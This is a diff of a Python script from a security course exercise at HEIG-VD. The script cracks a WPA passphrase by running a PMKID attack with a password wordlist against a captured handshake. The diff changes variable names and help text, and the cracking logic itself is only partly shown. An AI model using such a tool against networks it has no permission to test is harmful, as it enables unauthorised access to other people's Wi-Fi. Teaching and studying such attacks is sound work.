@@ -85,13 +85,13 @@ def find_ssid(ap_mac, packets):
 
 
 def main(pcap_file, dictionary):
-    # Read capture file -- it contains beacon, authentication, association, handshake and data
+
     print("Reading the file...", end="", flush=True)
-    wpa = rdpcap(pcap_file)
+    packets = rdpcap(pcap_file)
     print("OK")
 
     print("Finding Handshake packet...", end="", flush=True)
-    p = get_pmkid_packet(wpa)
+    p = get_pmkid_packet(packets)
     print("OK")
 
     pmkid = p.wpa_key[-16:]
@@ -99,7 +99,7 @@ def main(pcap_file, dictionary):
     ap_mac = p.addr2  # we need the byte value to find the ssid
 
     print("Finding SSID...", end="")
-    ssid = find_ssid(ap_mac, wpa)
+    ssid = find_ssid(ap_mac, packets)
     print("OK")
 
     ap_mac = a2b_hex(ap_mac.replace(':', ''))
@@ -127,17 +127,17 @@ def main(pcap_file, dictionary):
 
 
 if __name__ == "__main__":
-    default_wordlist = "wordlists/WiFi-WPA/probable-v2-wpa-top4800.txt"  # https://github.com/Taknok/French-Wordlist
+    default_wordlist = "wordlists/WiFi-WPA/probable-v2-wpa-top4800.txt"
 
     # just parsing arguments
     parser = argparse.ArgumentParser(
-        description="Performs a dictionary-based bruteforce of the passphrase PMKID.",
+        description="Cracks the SSID passphrase using a PMKID attack with a given dictionary",
         epilog="This script was developped as an exercise for the SWI course at HEIG-VD")
 
     parser.add_argument("pcap",
                         help="Network capture containing the first packet of the WPA handshake, which contains the PMKID")
     parser.add_argument("-d", "--dictionary", default=default_wordlist,
-                        help="The dictionary to use for bruteforcing the key. By default, a french wordlist is used")
+                        help="The dictionary to use for bruteforcing the key. By default, a wordlist containing the most popular 4800 passwords is used")
     args = parser.parse_args()
 
     main(args.pcap, args.dictionary)
